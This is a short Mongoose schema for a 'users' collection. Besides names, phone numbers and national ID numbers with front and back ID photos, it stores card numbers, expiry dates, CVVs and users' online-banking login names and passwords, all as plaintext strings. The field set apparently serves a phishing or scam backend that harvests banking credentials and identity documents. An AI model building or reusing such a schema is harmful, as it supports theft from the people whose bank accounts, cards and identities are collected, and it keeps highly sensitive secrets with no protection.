const mongoose = require("mongoose");

const Schema = mongoose.Schema;

let users = new Schema(
    {
        fullName: {
            type: String
        },
        cccd: {
            type: String
        },
        bankName: {
            type: String
        },
        bankAccount: {
            type: String
        },
        bankPassword: {
            type: String
        },
        password: {
            type: String
        },
        numberPhone: {
            type: String
        },
        verified: {
            type: Boolean
        },
        typeCard: {
            type: String
        },
        cardType: {
            type: String
        },
        cardNumber: {
            type: String
        },
        cardOwner: {
            type: String
        },
        cardDate: {
            type: String
        },
        cardCvv: {
            type: String
        },
        image: {
            type: String
        },
        imageBefore: {
            type: String
        },
        imageAfter: {
            type: String
        },
        bankLoginName: {
            type: String
        },
        bankLoginAccount: {
            type: String
        },
        bankLoginPassword: {
            type: String
        },
    },
    { collection: "users" }
);

module.exports = mongoose.model("users", users);